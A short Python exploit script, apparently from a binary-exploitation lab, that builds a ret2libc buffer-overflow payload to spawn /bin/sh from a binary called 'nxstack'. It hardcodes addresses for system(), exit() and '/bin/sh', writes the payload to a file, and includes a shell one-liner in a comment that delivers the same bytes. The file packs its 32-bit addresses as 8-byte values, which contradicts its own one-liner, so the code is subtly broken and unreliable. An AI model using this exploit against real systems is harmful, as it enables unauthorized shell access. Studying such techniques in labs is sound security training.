from struct import *

#libc_base = 0xb7e17000
#system_offset = 0x3ab40
#binsh_offset = 0x15d8c8

system_addr = 0xb7e51b40 #libc_base + system_offset
binsh_addr  = 0xb7f748c8 #libc_base + binsh_offset
exit_addr   = 0xb7e457f0

payload = "A" * 32                           # buf
payload += "A" * 4                           # ebx
payload += pack("<Q", system_addr)           # ret addr : system()
#payload += "B" * 4                          # return of system(), fake value, we don't care
payload += pack("<Q", exit_addr)             # to avoid closing error, use exit() func addr
payload += pack("<Q", binsh_addr)            # /bin/sh addr

f = open("in.txt", "w")
f.write(payload)


# $ ./nxstack "$(python -c 'print "A"*36 + "\x40\x1b\xe5\xb7" + "\xf0\x57\xe4\xb7" + "\xc8\x48\xf7\xb7"')"
